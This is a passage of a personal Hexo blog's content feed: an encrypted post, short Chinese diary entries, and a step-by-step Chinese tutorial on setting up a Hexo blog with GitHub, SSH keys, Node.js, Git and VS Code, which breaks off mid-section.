4780c0c71ffa91090906d64fb8ae4d95665c1f8b8a5a7b1ebbb665199fb26edae0aca1b635bd30d7c19665cc312e6ab61312a1b5d7afdc41a97f4ef98593bcc60909d584c70a7c09dab45ab8fe2903acd197f0f3456fa2e66a57b08f22e48e99be0c65b40b520176fddbec653be016d62514ec1d4a249e2a0224f93a6170d3355a1e8835155f36295c0f9cce44caf6d27480a9285d242832ec690810a2d63366fe853c64f6fed8599b191912e19efe15d5dc22f528f17a168a2d64e93316bef9ad22b16134d5595e80ce0eacd54a8d7d12801885b7234dd29b0f4fd3512501159552ed3db26a532976b424b18cfbbf33df3dceffcb2e45c035903067bd687137d054e26d5f944b503bb5be5d88858b490829898af3503aa269e7da42234b9294b0648553079eeae7a20c3bf2b3809d9df5202fc8bd0c7efe3a13549a6d39b25f4dcfd8c3ad5ef16b4988008c4c87fdb4f2c0f8084784a05e6604dab41c65c1b9add709f54dd7a948d56e5ca2ea14155fe8ac979fa1f68df7210a775367291787be59d4faf18db5726c4210e5393142de4831dde6b9c4c1e80f1973035d2983dfddc86e6c708cd37fe4b3f6259c60d982a1f91ebdbc61a67f38da90a6f20db57e1cb74039e14542b9b5496e0af874aee9beccaa0efada7f286a28f3a535cad4f6953dfa7aecca603309f268d593f72e3960db3ea0ce4329cb0f8a1d100e2d9df25d9f91aa0dd601d6924c59a9e1005aa988aa15a5ecc37ded701db8e75f60065ca72a7177b3aa296e27ff12b3024ed92f45027318a124a3a96da661d6b161d5f41fe65efad5585b09308875ed36081d462e6fca9ed32f2c782c3708726801d06d5b0847025ca6200179c783fcd388558cc2ff055120cd594d8fed82392db49d6a6855b4fa163dad9f90e04eb50140588584c892b48346bbe583fa348cd4338051038d596e70b902657fc40b6a019315f732e150f265b0278428722061b26791dc231f7583838f3c6b4560fee15d093e2171f6f542c8f5d59d2a8550c8c63f1623816dd898c7eef41bf6a35d1bc2317b9e4f90a4864dcb9359a9ffc64927442420890c486d89c28ed61fe3161488cef88c6c484002112096bc57a47c5e1257101e7007738aedc183e383e98b704d36e56f163a152b04a1dfe41db5934f75e6ccae6617399ef17972572455e4f173494f3eaee1af1d48a472caa28369627340d6327c7f92ee636dddc78d96e6390ce8e945e1717f79624be72cc567cadb9064385b2e06369ae1526484cd5680436be91ef3f3c5cf250794437c88b8b895653d2b6e742b54683989d9078f08b7accaa9740d945b499f0c963cb4eaff208c8daa141640fb81f24272eac7c6463ef039c1f016268be71d5a9376d0ce447b97f16945f266ea83c82a99feb83831edb383f96c9e2262ad88e6cb6c83020bc9315c5bd48a9645c0392c65c798cf93fd22efaa3438601143a3072ecd8b1b6d7cb8e89c98ddc7159d144b3e45b8941f82348e2fe6b7ea37b7416c4f80c7655e52a7b9f01bf93f21af45e95ddaf4859e37d3eec9ca708fe7846e87534c697c0740c6efd5ae51388fe461bb0a7112e4c2a458970e21c3c7930d4ecef2487c702f060daf9443a11751a7d8d65bb691b69f88d601c74ccfd3e8724c733a34df302e29d41024d181d969eea2e3c8b46fc22616c362321684fd9d493f61fa1fff82db78588eacd4eba0d1c79b0eacb8f3ba4bcb61e6403ac5e4ca984e48d530034c248e57571386575043367a9523c620a8973525429469d796fbd832b2ceffb7c6f061b1ce253acf8d98e2f0fe4991d144ea544ab9be6ebd9dc9f943788174e512d0de91adf569f4cebd231585ea686fb14e981909ee3b5fd7cb9591b8de7351e2dcc57e43aa4e73be6ad809c13117cb034483846c11eae2d9e05c8f99079ad7c4441bb2caad8857a87b0ed6857e6c23152d8bbcab9b587eaf57963e428bcb370f69bc35d23b77a46905d7a99b8ed7a06b7a042b0edd1095a3aac3993e69dc5bb00b68f819fe30a40b9cd3a9339961b37da9ba70167f50a8cac1622ac54214a16781e0e30106da0d9f50da0811383570d0ec570fb6b54580d5bdab3eea1a7eaa30e36eea19d1f22eb90cd2186ecc0df242172e1e7d31eb8d787dd438d9d9f7d1c2ef828ca08e94bb185bea27ea9b7257ebaeca2eaf2405041480e7024630dfa9c29f1a89e2868db392b1752ca6da2a29564608b5d1cc01088018c819c779930a7ab3ec07a2b5c34854c2759bd43ca2c1fb7c700f6e51bf5f4baae71d023184759e3032ba7fb275126d597204a8dad6c7c4157b87e9b07fc99d0713e096654ae4e457bfbbb3bb512bf3e6e395b36345f0556cc85fd0294fb2b967e7a594d053ec5035a8af82c7b92c7aab4686c352f3007e7a1cf46f89dd8ffa5b69b109696dc4c705648842fdaae18f4f14ff2e8120b5234067f4a8e6899dc9c1ac4446f38b8b77a3b388e6f946ff2328ca0f2d7d8f92fa235db02279aaa2a2ec266799e0d5c02b8d0519848e2206988e71c3e839f7c468a64848a3c9729610a6eeecb861dfb6a045f3e99c0dbee4d0f19ae496f53377239bd2762e25ded5ea492e3a7943257814571421701a67df8691e1f9e7a59bc57ecd38104dd76967db3550ee1208d1903839aa4692de0c365797ab8861a601397655885d419f2a3cee3d0b807b319c736d90acaac09984e870c2553262e8f568cabfa414fce8b4e44d9c3100a2a63e7d99ebe6552a3aa6d4a4656cc150f776a0334ebd7b394a7b59d6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter my Bday, hope u remember!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RainyDay</title>
    <link href="/2025/05/06/RainyDay/"/>
    <url>/2025/05/06/RainyDay/</url>
    
    <content type="html"><![CDATA[<p>这两天去推拿馆的时候都下雨了。</p><p>我被妈妈套上雨衣，坐在电瓶车后座，头抵着她的背玩手机。</p><p>无聊的时候看到袖子上雨的形状有些混乱，想到前几天看到一个鉴ai的帖子，这样不规则又不闭合的线条，一看就是ai了。</p><p>现在ai绘图已经这么厉害了吗？创作者们要怎么办啊。</p><p>今天也在搭系统，Claude也好厉害，完全无法想象没有大模型之前要怎么编程。</p><p>我不会手打任何一行代码。。。</p><p>–</p><p>我服了，摸着黑在房间里熬夜搭系统，我妈反反复复起夜好几次，终于在门外问了句 你还在玩手机吗</p><p>吓死我得了。。。。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BadMood</title>
    <link href="/2025/04/25/badmood/"/>
    <url>/2025/04/25/badmood/</url>
    
    <content type="html"><![CDATA[<p>这两天心情好烂，好像又回到了去年怀疑自己在做的东西有什么意义的日子。</p><p>不够坦诚 不够坚定 不能明确地拒绝</p><p>不够自私 不够摆烂 失败的完美主义</p><p>可能也是因为我选错了人吗？做了错误的选择才会这样吧？</p><p>也可能不能要求这么多，或许也没有那么糟糕</p><p>–</p><p>焦虑地担心未来</p><p>–</p><p>比起回家，其实更期待的事情是，要去映秀了</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Discard</title>
    <link href="/2025/04/23/discard/"/>
    <url>/2025/04/23/discard/</url>
    
    <content type="html"><![CDATA[<p>本来想把写在西斯迪恩上的搭建教程放到这上面，不知道为什么图片老是加载不出来，于是还是隐藏了</p><p>–</p><p>吼吼 原来之前放lab的时候就有这个防盗链的问题了，已经解决过了啊，果然还是要把解决bug的过程及时记录下来才行</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HexoSetup</title>
    <link href="/2025/04/22/hexosetup/"/>
    <url>/2025/04/22/hexosetup/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Hexo博客搭建教程</h1><p>帮完全不接触cs相关的朋友们搭过几次博客之后，发现很多教程还是有不完整的部分，所以决定自己写一个完整的hexo配置教程，方便日后自己查找。</p><p><font color='orange'>*注：因为各个主题的配置不相同，介绍起来太复杂，所以这里就不对主题配置进行说明了，可以去看各个主题的配置文件。</font></p><hr><h3 id="本篇包括：">本篇包括：</h3><ol><li><a href="#GitHub%E8%B4%A6%E5%8F%B7%E5%88%9B%E5%BB%BA">GitHub账号创建</a></li><li><a href="#GitHub%E9%85%8D%E7%BD%AEssh-keygen">GitHub配置ssh-keygen</a></li><li><a href="#Node-js%E5%AE%89%E8%A3%85">Node.js安装</a></li><li><a href="#Node-js%E8%AE%BE%E7%BD%AE">Node.js设置</a></li><li><a href="#Git%E5%AE%89%E8%A3%85">Git安装</a></li><li><a href="#Git%E9%85%8D%E7%BD%AE">Git配置</a></li><li><a href="#VS-Code%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">VS Code安装与配置</a></li><li><a href="#%E6%90%AD%E5%BB%BAHexo">搭建Hexo</a></li><li><a href="#%E4%BF%AE%E6%94%B9-config-yml">修改<code>_config.yml</code></a></li><li><a href="#%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98">修改主题</a></li><li><a href="#GitHubPages%E6%89%98%E7%AE%A1">GitHub Pages托管</a></li><li><a href="#hexo-admin%E6%8F%92%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE"><font color='purple'>*hexo-admin插件的配置</font></a></li></ol><p><font color='red'>*注：没有主题配置</font></p><hr><h3 id="参考">参考</h3><p>先放上当时搭建博客时看的教程，有所参考，已经写得相当详细了：</p><blockquote><p><a href="https://blog.csdn.net/cat_bayi/article/details/128725230">Hexo教程，看这一篇就够了- How to系列</a></p></blockquote><hr><h3 id="环境与软件版本">环境与软件版本</h3><p>Windows 11 家庭中文版 23H2</p><p>Node.js <strong>v22.14.0</strong></p><p>Git for Windows (<strong>2.49.0</strong>) <strong>64-bit</strong></p><p>Visual Studio Code <strong>x64 1.99.3</strong></p><p><font color='orange'>*注：不一样不用纠结，其实大差不差</font></p><hr><h3 id="GitHub账号创建">GitHub账号创建</h3><p>已有github账号可跳至<a href="#GitHub%E9%85%8D%E7%BD%AEssh-keygen">GitHub配置ssh-keygen</a></p><ol><li><p>进入<a href="https://github.com/">github官网</a>，点击右上角的<code>sign up</code></p><p><font color='orange'>*有的时候可能无法裸连，尝试科学上网</font></p><p><img src="http://gitee.com/r0otsu/piclist/raw/master/20250418150634669.png" alt=""></p></li><li><p>创建github账号，填写邮箱、密码、用户名、国家地区</p><p>这里的用户名考虑清楚，之后会在博客的域名中直接用到；只能包含字母数字字符或单个连字符(-)，并且不能以连字符开头或结尾</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418151813055.png" alt="image-20250418151812912"></p></li><li><p>任意选择一个进行验证</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418151858895.png" alt="image-20250418151858757"></p><p>通过验证，证明是人类了kkkk</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418152151375.png" alt="image-20250418152151230"></p></li><li><p>然后会给邮箱发验证码，填写上去</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418152623107.png" alt="image-20250418152622967"></p></li><li><p>填写后就可以根据自己刚刚填写的用户名或邮箱和密码，点击<code>sigh in</code>进入github了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418152746330.png" alt="image-20250418152746238"></p></li></ol><hr><h3 id="GitHub配置ssh-keygen">GitHub配置ssh-keygen</h3><p>这一步是为了后面使用git时，能够更方便地使用git bash将博客推上github，不用每次输入github的邮箱和密码。</p><p>如果已经配置好了，请跳至<a href="#%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F">创建成功</a></p><h4 id="创建ssh-keygen">创建ssh-keygen</h4><ol><li><p>按下快捷键<code>win+r</code>，输入<code>cmd</code>后回车</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418153703954.png" alt="image-20250418153703896"></p></li><li><p>打开了终端，在终端中输入如下，<font color="purple">引号中是刚才配置github账号的邮箱</font></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ssh-keygen -t rsa -C &quot;你的github邮箱&quot;<br></code></pre></td></tr></table></figure><p>这里因为我有之前账号的公钥，所以overwrite了，正常如果没有配置过，一路<font color='red'>回车</font>即可，密钥在红框所指的路径<code>id_rsa.pub</code>文件中</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418154744459.png" alt="image-20250418154744387"></p></li><li><p>找到这个<code>id_rsa.pub</code>文件，用记事本打开，将其中的全部内容复制</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418155017309.png" alt="image-20250418155017246"></p></li></ol><h4 id="在github中添加ssh-key">在github中添加ssh key</h4><ol><li><p>回到github账号中，点击右上角的头像弹出侧边栏</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418155231414.png" alt="image-20250418155231299"></p><p>进入设置界面</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418155151857.png" alt="image-20250418155151736"></p><p>点击<code>SSH and GPG keys</code>后，点击<code>New SSH key</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418155416759.png" alt="image-20250418155416655"></p><p>title随便填，在下面的Key中将刚才<code>id_rsa.pub</code>文件中的全部粘贴进去，然后点击<code>Add SSH key</code>，创建成功</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418155839368.png" alt="image-20250418155839259"></p></li></ol><h4 id="创建成功">创建成功</h4><ol><li><p>显示这样就是创建成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418160037106.png" alt="image-20250418160036990"></p></li></ol><hr><h3 id="Node-js安装">Node.js安装</h3><p>已经安装nodejs可跳转至<a href="#Node-js%E8%AE%BE%E7%BD%AE">Node.js设置</a>检查一下配置</p><h4 id="安装">安装</h4><ol><li><p>进入<a href="https://nodejs.org/zh-cn/">Node.js的中文官网</a>，点击即可下载</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418160753461.png" alt="image-20250418160753282"></p></li><li><p>单击<code>.msi</code>文件开始安装，点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418160948044.png" alt="image-20250418160947982"></p></li><li><p>选择accept后，点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418161028676.png" alt="image-20250418161028610"></p></li><li><p>选择安装路径，这里<font color='red'>不要</font>放在C盘或其他盘的<code>Program File</code>文件夹下，亲测会有因为权限问题而报错</p><p><font color='green'>*建议如果别的情况下不需要nodejs，可以在非C盘根目录下创建一个<code>blog</code>文件夹，这样可以将后面安装的其他软件也放进去</font></p><p>这里因为我还有别的需要用到nodejs的情况，所以直接放在D盘根目录了，选择好后点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418161448387.png" alt="image-20250418161448324"></p></li><li><p>不用打勾，继续next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418161625061.png" alt="image-20250418161624977"></p></li><li><p>点击install，获取管理员权限后，开始安装</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418161700416.png" alt="image-20250418161700356"></p></li><li><p>点击Finish，就算安装完成了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418161729066.png" alt="image-20250418161729005"></p></li></ol><h4 id="测试">测试</h4><ol><li><p>检查一下是否安装成功</p><p><code>win+r</code>输入<code>cmd</code>打开终端，在<code>cmd</code>终端中输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">node -v<br>npm -v<br></code></pre></td></tr></table></figure><p>有返回则说明安装成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418162024338.png" alt="image-20250418162024281"></p></li></ol><hr><h3 id="Node-js设置">Node.js设置</h3><h4 id="设置全局安装和缓存文件的路径">设置全局安装和缓存文件的路径</h4><ol><li><p>在上一步安装node.js的路径中，新建<code>node_global</code>和<code>node_cache</code>文件夹</p><p>比如我的就是<code>D:\nodejs</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418162311825.png" alt="image-20250418162311752"></p></li><li><p><code>win+r</code>输入<code>cmd</code>打开终端，将刚刚两个文件夹的路径分别作为全局安装的包和缓存文件的文件夹，在终端中输入，<font color='purple'>引号中的路径修改成自己的</font></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">npm config <span class="hljs-built_in">set</span> prefix &quot;D:\nodejs\node_global&quot;<br>npm config <span class="hljs-built_in">set</span> cache &quot;D:\nodejs\node_cache&quot;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418162629082.png" alt="image-20250418162629012"></p></li></ol><h4 id="编辑环境变量">编辑环境变量</h4><ol><li><p>搜索<code>环境变量</code>，打开</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418163001910.png" alt="image-20250418163001637"></p></li><li><p>点击环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418163032520.png" alt="image-20250418163032446"></p></li><li><p>点击<code>用户变量</code>中的<code>新建</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418163116116.png" alt="image-20250418163116030"></p></li><li><p>在弹出来的窗口中，创建名称为<code>NODE_PATH</code>，路径为自己Node.js的安装路径，比如我的是<code>D:\nodejs</code>，点击确定</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418163343022.png" alt="image-20250418163342940"></p></li><li><p>在下面的系统变量中的变量一列，找到<code>PATH</code>，<strong>双击</strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164005732.png" alt="image-20250418164005637"></p></li><li><p>点击<code>新建</code>后，将<code>node_global</code>的路径输入，完成后点击确定</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418163817874.png" alt="image-20250418163817790"></p></li><li><p>一路点击确定即可</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164046197.png" alt="image-20250418164046111"></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164102476.png" alt="image-20250418164102389"></p></li></ol><hr><h3 id="Git安装">Git安装</h3><p>git能够更方便地将自己的项目上传到github上</p><p>如果已经安装过了，可以跳转至<a href="#Git%E9%85%8D%E7%BD%AE">Git配置</a></p><ol><li><p>进入<a href="https://git-scm.com/">Git官网</a>后，点击<code>Download for Windows</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164347767.png" alt="image-20250418164347370"></p></li><li><p>点击下载64位的</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164503836.png" alt="image-20250418164503426"></p></li><li><p>双击下载好的<code>.exe</code>文件后，点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164638486.png" alt="image-20250418164638421"></p></li><li><p>这里也是一样</p><p><font color='green'>*建议如果别的情况下不需要git，可以刚才在非C盘根目录下创建的<code>blog</code>文件夹下，将git也安装进去</font></p><p>这里因为我还有别的需要用到git的情况，所以放在D盘根目录，选择好后点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418164818788.png" alt="image-20250418164818718"></p></li><li><p>将最后一个勾选上，意思是“在终端中加入Git Bash”，然后点击next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165021232.png" alt="image-20250418165021148"></p></li><li><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165144796.png" alt="image-20250418165144729"></p><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165206981.png" alt="image-20250418165206897"></p></li><li><p>这里主干名字可以改成main，点击next</p><p><font color='orange'>*不改也没关系，之后使用deploy的时候修改主干写成&quot;master&quot;即可，改了就是main</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165249648.png" alt="image-20250418165249582"></p></li><li><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165510708.png" alt="image-20250418165510636"></p><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165525666.png" alt="image-20250418165525602"></p></li><li><p>这里我也不知道有什么特别的差别，但选前一个，然后next</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165651217.png" alt="image-20250418165651132"></p></li><li><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165715841.png" alt="image-20250418165715769"></p><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165737480.png" alt="image-20250418165737405"></p><p>这里也是默认选择合并分支</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165815494.png" alt="image-20250418165815425"></p><p>默认</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165835309.png" alt="image-20250418165835227"></p><p>默认，点击开始安装</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418165900249.png" alt="image-20250418165900180"></p></li><li><p>这样就算安装完成了，点击finish</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418170016385.png" alt="image-20250418170016322"></p></li></ol><hr><h3 id="Git配置">Git配置</h3><ol><li><p>首先打开<code>git bash</code></p><p>可以搜索<code>git bash</code>，直接打开</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418171216677.png" alt="image-20250418171216381"></p><p>也可以<code>win+r</code>输入<code>cmd</code>打开终端，如果刚才勾选了&quot;(NEW!)Add a Git Bash Profile to Windows Terminal&quot;，应该可以这样找到<code>git bash</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418171505757.png" alt="image-20250418171505636"></p><p>或者在任意一个文件下，右键文件夹找到<code>open git bash here</code>，也能打开<code>git bash</code></p></li><li><p>在<code>git bash</code>中输入命令，<font color='purple'>引号中的修改成自己的</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;你的github用户名&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;你的github邮箱&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418172053757.png" alt="image-20250418172053699"></p></li></ol><hr><h3 id="VS-Code安装与配置">VS Code安装与配置</h3><p>已经安装可以直接跳至<a href="#%E6%90%AD%E5%BB%BAHexo">搭建Hexo</a></p><h4 id="安装-v2">安装</h4><ol><li><p>进入<a href="https://code.visualstudio.com/download">VS Code官网</a>，点击<code>Windows</code>即可下载</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418172708666.png" alt="image-20250418172708559"></p></li><li><p>选择同意，下一步</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418172750826.png" alt="image-20250418172750746"></p></li><li><p>选择安装路径，这里也是一样的</p><p><font color='green'>*建议如果别的情况下不需要用到vscode，可以刚才在非C盘根目录下创建的<code>blog</code>文件夹下，将vscode安装进去</font></p><p>这里我就安装到了我之前安装的位置</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418172851057.png" alt="image-20250418172850981"></p></li><li><p>默认即可</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418173037172.png" alt="image-20250418173037082"></p></li><li><p>建议全部勾选，后期对于博客的修改也是通过vscode，放在桌面比较方便，不用就取消勾选创建快捷方式</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418173117726.png" alt="image-20250418173117647"></p></li><li><p>点击安装</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418173223618.png" alt="image-20250418173223535"></p></li><li><p>取消勾选运行，点击完成</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418173355008.png" alt="image-20250418173354920"></p></li></ol><h4 id="将vscode设置为中文">将vscode设置为中文</h4><ol><li><p>点击左侧栏中的扩展，搜索<code>Chinese</code>，安装简体中文</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418173926504.png" alt="image-20250418173926352"></p></li><li><p>安装完成后，右下角会有弹窗，点击<code>更改语言</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418174043596.png" alt="image-20250418174043422"></p></li><li><p>如果没有的话，在上面搜索栏，输入<code>&gt;configure language</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418174341321.png" alt="image-20250418174341154"></p><p><code>回车</code>后，就能选择中文了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418174410289.png" alt="image-20250418174410135"></p><p>点击restart后，重启应用，打开就是中文了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418174514886.png" alt="image-20250418174514743"></p></li></ol><hr><p>至此所有的环境即软件配置已经完成了，如果想要更好地写博客，可以再安装一个<code>Typora</code>，这类似一个文本编辑器，比vscode内写博客会更直观一些，没有也没关系。</p><hr><h3 id="搭建Hexo">搭建Hexo</h3><h4 id="安装hexo">安装hexo</h4><ol><li><p>首先确定自己的博客要搭建在哪个文件夹里，只要是空文件夹都可以</p><p><font color='green'>*这里建议，如果前面在非C盘根目录下创建了<code>blog</code>文件夹，可以在<code>blog</code>文件夹下创建自己用户名的文件夹，这样的话，这篇教程中的所有新安装软件都在一个文件夹下了</font></p><p><font color='orange'>*当然也可以任意一个文件夹下，只要方便自己记忆就可以</font></p><p>比如这里，我在<code>D:\blog</code>创建了新文件夹<code>test-0hh</code>，这个文件夹中将存放我用于hexo博客的文件</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418200508519.png" alt="image-20250418200508430"></p></li><li><p>如果之前在安装vscode中勾选了在桌面创建快捷方式，应该可以直接在桌面中找到，右键选择<code>以管理员身份运行</code></p><p>没有也没关系，搜索找到vscode，右键选择<code>以管理员身份运行</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418200739349.png" alt="image-20250418200738978"></p></li><li><p>vscode的上边栏里点击文件，选择打开文件夹</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418201129015.png" alt="image-20250418201128865"></p><p>找到刚才新建的用于存放hexo博客的文件夹，比如我的是<code>D:\blog\test-0hh</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418201227523.png" alt="image-20250418201227434"></p></li><li><p>vscode的上边栏里，点击<code>三个点</code>，找到<code>终端</code>，点击新建终端</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418195345396.png" alt="image-20250418195345282"></p></li><li><p>这时候应该默认出来的是<code>powershell</code>的终端，但是我们需要打开<code>git bash</code>的终端</p><p>加号旁边的<code>倒三角</code>，点击一下，点开<code>git bash</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418195629294.png" alt="image-20250418195629184"></p><p>下方终端是<code>bash</code>就对了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418201357076.png" alt="image-20250418201356992"></p></li><li><p>在终端中输入命令安装hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418201632586.png" alt="image-20250418201632482"></p><blockquote><p>这里如果安装时有显示权限问题，可能是前面配置nodejs时有步骤出错了，跳回去<a href="#Node-js%E8%AE%BE%E7%BD%AE">Node.js设置</a>再检查一遍<br>或者看这一篇博文：<a href="https://blog.csdn.net/weixin_55992854/article/details/121140754">nodejs的安装和全局配置(超详细哦)</a><br>这篇是朋友在搭建时遇到报错搜到的解决贴，亲测有效</p></blockquote></li><li><p>输入命令测试一下，一下子把所有的包的版本这些都打印出来了，就说明hexo已经安装成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo -v<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418201733297.png" alt="image-20250418201733200"></p></li></ol><h4 id="初始化hexo">初始化hexo</h4><ol><li><p>在当前的新建文件夹（<code>D:\blog\test-0hh</code>）下，初始化博客</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init<br></code></pre></td></tr></table></figure><p>下面输出<code>Start blogging with Hexo!</code>，并且左边出现了很多文件，就说明hexo初始化成功了</p><p><font color='orange'>*如果这里输出不一样，可能是github连接不稳定，可以将文件夹中的文件全部删除后，再尝试一次</font></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418204025467.png" alt="image-20250418204025211"></p></li></ol><h4 id="npm安装依赖">npm安装依赖</h4><ol><li><p>继续在终端中输入命令，安装hexo需要的依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418204231217.png" alt="image-20250418204231142"></p></li></ol><h4 id="更改-gitignore">更改<code>.gitignore</code></h4><ol><li><p>首先为了方便后面的修改，点击一下上边栏的<code>文件</code>-&gt;<code>自动保存</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418220910192.png" alt="image-20250418220910061"></p></li><li><p>不太明白，但是在博客文件夹根目录的<code>.gitignore</code>最后一行添加这一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*.code-workspace<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20250418204548862.png" alt="image-20250418204548753"></p></li></ol><h4 id="测试服务器">测试服务器</h4><ol><li><p>在<code>bash</code>终端中输入</p><figure class="highlight bash"><table><tr><td 